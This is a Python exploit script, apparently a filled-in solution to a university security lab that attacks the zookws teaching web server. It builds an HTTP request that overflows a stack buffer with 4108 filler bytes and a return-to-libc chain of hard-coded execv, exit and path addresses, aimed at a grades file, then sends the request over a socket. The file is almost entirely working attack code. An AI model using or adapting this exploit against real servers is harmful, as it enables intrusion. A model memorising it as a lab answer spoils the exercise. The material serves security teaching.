#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct
import time

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer_start = "0xbfffcdc0"
file_path = "/home/httpd/grades.txt"
stack_retaddr = "0xbfffdddc"
execv_addr = struct.pack("<I",int("0x40102450", 0))
exit_addr = struct.pack("<I",int("0x40058150", 0))
file_path_addr = struct.pack("<I",int("0xbfffdde8", 0)) 

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    inject = ""
    for i in range(0,4108):
        inject += "A"
    
    s_ptr = struct.pack("<I",0) + struct.pack("<I",0) + struct.pack("<I",0) \
    + struct.pack("<I",0) + execv_addr + exit_addr + file_path_addr
    
    req = inject + s_ptr + file_path + "\r\n" + \
          "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())